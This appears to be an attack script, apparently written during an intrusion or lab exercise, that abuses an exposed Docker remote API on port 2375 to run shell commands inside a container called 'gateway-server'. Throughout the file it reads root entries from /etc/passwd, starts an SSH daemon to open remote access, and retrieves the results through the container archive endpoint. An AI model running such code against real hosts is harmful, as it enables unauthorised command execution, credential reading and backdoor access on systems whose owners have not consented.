import urllib.request, json, time
URL = 'http://172.16.0.40:2375'

# Use start-stop-daemon or just nohup
# Actually, exec a shell that detaches sshd
# Use setsid + nohup

# Check if sshd is installed
body = json.dumps({"Cmd": ["sh", "-c", "ls /usr/sbin/sshd > /tmp/p.log 2>&1; cat /etc/passwd | grep root >> /tmp/p.log 2>&1"]}).encode()
req = urllib.request.Request(f'{URL}/containers/gateway-server/exec', data=body, headers={'Content-Type': 'application/json'}, method='POST')
r = urllib.request.urlopen(req)
eid = json.loads(r.read())['Id']
urllib.request.urlopen(urllib.request.Request(f'{URL}/exec/{eid}/start', data=b'{"Tty":false}', headers={'Content-Type': 'application/json'}, method='POST')).read()
time.sleep(3)
r = urllib.request.urlopen(f'{URL}/containers/gateway-server/archive?path=/tmp/p.log', timeout=10)
data = r.read()
sz = int(data[124:136].rstrip(b'\x00').rstrip(b' ').decode('utf-8'), 8) if data[124:136].rstrip(b'\x00').rstrip(b' ').decode('utf-8') else 0
print("=== sshd exists ===")
print(data[512:512+sz].decode('utf-8', errors='replace'))

# Make a startup script that starts sshd before java
# Easier: just start sshd as foreground daemon mode (detaches from terminal)
# sshd -D = no detach. sshd (no flag) = daemon mode, exits
body = json.dumps({"Cmd": ["sh", "-c", "mkdir -p /var/run/sshd; /usr/sbin/sshd > /tmp/sshd.log 2>&1; sleep 1; netstat -tln 2>/dev/null | grep 22 >> /tmp/p.log; cat /tmp/p.log"]}).encode()
req = urllib.request.Request(f'{URL}/containers/gateway-server/exec', data=body, headers={'Content-Type': 'application/json'}, method='POST')
r = urllib.request.urlopen(req)
eid = json.loads(r.read())['Id']
urllib.request.urlopen(urllib.request.Request(f'{URL}/exec/{eid}/start', data=b'{"Tty":false}', headers={'Content-Type': 'application/json'}, method='POST')).read()
time.sleep(5)
r = urllib.request.urlopen(f'{URL}/containers/gateway-server/archive?path=/tmp/p.log', timeout=10)
data = r.read()
sz = int(data[124:136].rstrip(b'\x00').rstrip(b' ').decode('utf-8'), 8) if data[124:136].rstrip(b'\x00').rstrip(b' ').decode('utf-8') else 0
print("=== sshd after start ===")
print(data[512:512+sz].decode('utf-8', errors='replace'))

# Test from inside
import socket
s = socket.socket()
s.settimeout(3)
try:
    s.connect(('127.0.0.1', 22))
    print("127.0.0.1:22 OPEN from container!")
    s.close()
except Exception as e:
    print(f"127.0.0.1:22: {e}")
